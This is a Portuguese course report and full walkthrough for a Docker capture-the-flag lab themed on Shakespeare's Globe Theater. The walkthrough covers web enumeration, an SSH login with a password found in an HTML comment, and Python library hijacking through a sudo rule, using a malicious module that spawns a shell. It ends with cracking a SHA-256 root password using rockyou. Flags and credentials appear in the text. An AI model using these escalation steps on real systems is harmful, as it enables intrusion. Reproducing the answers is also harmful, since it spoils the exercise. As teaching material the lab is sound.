# Relatório Técnico e Walkthrough — CTF "The Globe Theater"

**Disciplina:** Segurança Ofensiva / Tópicos Avançados em Computadores (TAC)  
**Formato:** Pentest-Based CTF em Container Docker  
**Plataforma Alvo:** `linux/amd64`  
**Flags:** `TAC{...}` (User Flag e Root Flag)  

---

## 1. Contextualização do Cenário

O desafio **The Globe Theater** ambienta-se no lendário teatro londrino do início do século XVII (1603), época das célebres tragédias de William Shakespeare. O cenário simula um servidor institucional da corte de onde são gerenciados manuscritos, anotações de ensaios e arquivos de estado da realeza da Dinamarca (*Hamlet*) e dos generais de Veneza (*Otelo*).

O objetivo do invasor é assumir a postura de um auditor de segurança/pentester que ataca exclusivamente via rede. O fluxo exige:
1. **Enumeração Web e Coleta de Inteligência:** Descoberta de rota oculta no acervo e dedução de credenciais a partir de pistas no código-fonte e na literatura shakespeariana.
2. **Acesso Inicial:** Obtenção de sessão interativa remota via SSH com usuário não-privilegiado (`hamlet`).
3. **Enumeração Local e Movimentação Lateral:** Exploração de privilégios controlados no `sudoers` associados a um script de verificação de peças teatrais, explorando a falha de **Python Library Hijacking** para assumir o usuário `othello` e capturar a primeira flag (`user flag`).
4. **Escalação de Privilégios para Root:** Localização de um bilhete confidencial (*Recado de Iago*) contendo um hash criptográfico SHA-256, quebra via ataque de dicionário (*rockyou*) e obtenção de acesso como `root` via `su` para leitura da `root flag`.

---

## 2. Instruções de Construção, Publicação e Execução

### 2.1 Construção Local da Imagem (Build)
Para compilar a imagem localmente (garantindo a compatibilidade com a arquitetura `linux/amd64` mesmo em sistemas host Apple Silicon/ARM):

```bash
docker buildx build --platform linux/amd64 -t nomedogrupo/the-globe-theater:1.0 --load .
```

Ou utilizando o `docker-compose.yml` de desenvolvimento:
```bash
docker compose build
```

### 2.2 Publicação no Docker Hub / GHCR
Após gerar a imagem com sua tag versionada:

```bash
docker login
docker push nomedogrupo/the-globe-theater:1.0
```

### 2.3 Execução pelo Avaliador / Outros Grupos
Os outros grupos deverão utilizar exclusivamente o arquivo `docker-compose-dist.yml`, que apenas baixa e executa a imagem pronta:

```bash
docker compose -f docker-compose-dist.yml up -d
```

Para verificar o status dos daemons internos:
```bash
docker compose -f docker-compose-dist.yml ps
```

Para encerrar e limpar o ambiente após o teste:
```bash
docker compose -f docker-compose-dist.yml down
```

---

## 3. Descrição Detalhada das Vulnerabilidades Implementadas

### 3.1 Exposição de Diretório Oculto e Comentário no Código-Fonte (CWE-200 / CWE-615)
* **Vetor:** O servidor web Nginx expõe na porta 8080 o diretório `/archive`. Essa rota consta nas listas comuns de força bruta de diretórios (`common.txt`).
* **Mecanismo:** Dentro de `/archive`, o arquivo `index.html` contém no código-fonte HTML o comentário `<!-- Senha de acesso: To_Be_Or_Not_To_Be_1603 -->`. Além disso, o arquivo `/archive/hamlet.txt` cita a tragédia do Príncipe da Dinamarca. O atacante relaciona o tema à conta do sistema operacional e utiliza o usuário `hamlet` com a senha descoberta para autenticar no serviço OpenSSH (porta 2222).

### 3.2 Movimento Lateral via Python Library Hijacking (CWE-427 / Uncontrolled Search Path)
* **Vetor:** O usuário `hamlet` possui a seguinte entrada no `/etc/sudoers.d/hamlet`:
  ```text
  hamlet ALL=(othello) NOPASSWD: /usr/bin/python3 /opt/scripts/theater.py
  ```
* **Mecanismo:** O script `/opt/scripts/theater.py` pertence a `othello` e tenta importar um módulo local:
  ```python
  import desdemona
  desdemona.verificar_fidelidade()
  ```
  O interpretador Python insere o diretório de trabalho atual (`sys.path[0]` ou diretório de execução) na prioridade de busca de módulos. O invasor posiciona-se em um diretório com permissão de escrita (`/tmp` ou `/home/hamlet`), cria um arquivo malicioso denominado `desdemona.py` contendo a chamada para um shell (`pty.spawn("/bin/bash")`) e dispara o comando com `sudo -u othello`. Ao executar, o script carrega o arquivo do invasor com privilégios de `othello`.

### 3.3 Uso de Senha Fraca e Quebra de Hash SHA-256 (CWE-326 / CWE-521)
* **Vetor:** No diretório do usuário `othello`, o arquivo `recado_de_iago.txt` armazena a mensagem:
  ```text
  Otelo, a lealdade da corte foi maculada. O segredo da coroa esta guardado sob a assinatura: 31553b994ab5e2e085b1e1eb815a58673196dfc1f4fb68c29fbdf867077f6205
  ```
* **Mecanismo:** A assinatura corresponde ao hash SHA-256 da palavra `desdemona`. Sendo uma palavra comum e histórica presente logo nas primeiras linhas da lista `rockyou.txt`, o atacante quebra o hash em menos de 2 segundos com ferramentas como John the Ripper ou Hashcat. A senha resultante desbloqueia a conta `root` via utilitário `su`.

---

## 4. Walkthrough Técnico Completo (Solução Passo a Passo)

### Etapa 1: Reconhecimento e Varredura de Rede
O atacante executa um port scan no alvo para mapear portas abertas:

```bash
nmap -sV -sC -p- 127.0.0.1 -p 8080,2222
```

**Saída esperada:**
* `8080/tcp open http nginx/1.22.1`
* `2222/tcp open ssh OpenSSH 9.2p1`

---

### Etapa 2: Enumeração Web e Obtenção de Credenciais
Ao acessar `http://127.0.0.1:8080`, o atacante visualiza a página inicial com o crânio de Yorick e o solilóquio *"To be, or not to be"*.

Execução de enumeração de diretórios com o `gobuster`:
```bash
gobuster dir -u http://127.0.0.1:8080 -w /usr/share/wordlists/dirb/common.txt
```

O `gobuster` identifica a rota `/archive` (Status 301/200).  
Acessando `http://127.0.0.1:8080/archive/`:
1. O atacante visualiza o link para `hamlet.txt`. Ao abri-lo, lê trechos da tragédia de Hamlet, inferindo a conta de usuário `hamlet`.
2. O atacante inspeciona o código-fonte da página (`Ctrl+U` ou via `curl`):
   ```bash
   curl -s http://127.0.0.1:8080/archive/ | grep "Senha"
   ```
   **Resultado:**
   ```html
   <!-- Senha de acesso: To_Be_Or_Not_To_Be_1603 -->
   ```

---

### Etapa 3: Acesso Inicial (Sessão SSH como Hamlet)
Com o usuário `hamlet` e a senha `To_Be_Or_Not_To_Be_1603`, o atacante conecta ao serviço SSH exposto na porta 2222:

```bash
ssh hamlet@127.0.0.1 -p 2222
```

O atacante obtém com sucesso uma sessão shell unprivileged:
```text
hamlet@the-globe-theater:~$ id
uid=1000(hamlet) gid=1000(hamlet) groups=1000(hamlet)
```

---

### Etapa 4: Movimentação Lateral para Othello (User Flag)
O atacante inicia a enumeração de privilégios locais consultando as regras de sudo:

```bash
sudo -l
```

**Saída:**
```text
Matching Defaults entries for hamlet on the-globe-theater:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User hamlet may run the following commands on the-globe-theater:
    (othello) NOPASSWD: /usr/bin/python3 /opt/scripts/theater.py
```

O atacante inspeciona o código de `/opt/scripts/theater.py`:
```bash
cat /opt/scripts/theater.py
```

Identifica a tentativa de carregar o módulo inexistente `desdemona`. Para explorar a vulnerabilidade de *Python Library Hijacking*, o atacante cria uma biblioteca maliciosa em `/tmp`:

```bash
cd /tmp
cat << 'EOF' > desdemona.py
import pty, os
def verificar_fidelidade():
    pty.spawn("/bin/bash")
EOF
```

Em seguida, executa o comando autorizado a partir de `/tmp`:
```bash
sudo -u othello /usr/bin/python3 /opt/scripts/theater.py
```

O payload é importado e executado, concedendo acesso à conta `othello`:
```text
othello@the-globe-theater:/tmp$ id
uid=1001(othello) gid=1001(othello) groups=1001(othello)
```

**Captura da User Flag:**
```bash
cat /home/othello/user.txt
```
**Flag:** `TAC{h4ml3t_m33ts_0th3ll0_1603}`

---

### Etapa 5: Escalação de Privilégios para Root (Root Flag)
Ainda no diretório de `othello`, o atacante identifica a pista deixada por Iago:

```bash
cat /home/othello/recado_de_iago.txt
```

**Conteúdo:**
```text
Otelo, a lealdade da corte foi maculada. O segredo da coroa esta guardado sob a assinatura: 31553b994ab5e2e085b1e1eb815a58673196dfc1f4fb68c29fbdf867077f6205
```

O atacante salva o hash em um arquivo local e realiza a quebra utilizando o John the Ripper com a lista `rockyou.txt`:

```bash
echo "31553b994ab5e2e085b1e1eb815a58673196dfc1f4fb68c29fbdf867077f6205" > hash.txt
john --format=raw-sha256 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

**Resultado:**
```text
desdemona        (31553b994ab5e2e085b1e1eb815a58673196dfc1f4fb68c29fbdf867077f6205)
```

Com a senha `desdemona`, o invasor troca para o usuário `root`:
```bash
su -
# Digite a senha: desdemona
```

Confirmando o acesso root:
```text
root@the-globe-theater:~# id
uid=0(root) gid=0(root) groups=0(root)
```

**Captura da Root Flag:**
```bash
cat /root/root.txt
```
**Flag:** `TAC{th3_r3st_1s_s1l3nc3_sh4k3sp34r3}`

---

## 5. Verificação do Código de Conduta e Segurança

1. **Isolamento de Container:**
   * O arquivo `docker-compose.yml` e o `docker-compose-dist.yml` **não** possuem `privileged: true`.
   * **Nenhum** socket do Docker (`/var/run/docker.sock`) é compartilhado com o container.
   * **Nenhum** diretório do host é montado em tempo de execução.
   * Não se utiliza `network_mode: host`.
2. **Ausência de Código Malicioso:**
   * O container utiliza apenas softwares e daemons padrão dos repositórios oficiais Debian (`nginx`, `openssh-server`, `python3`, `supervisor`, `sudo`).
   * Não há chamadas externas ou necessidade de conexão de internet durante a execução do CTF.
3. **Reprodutibilidade Estrita:**
   * O ambiente sobe em estado funcional de forma atômica através do comando `docker compose up -d`.

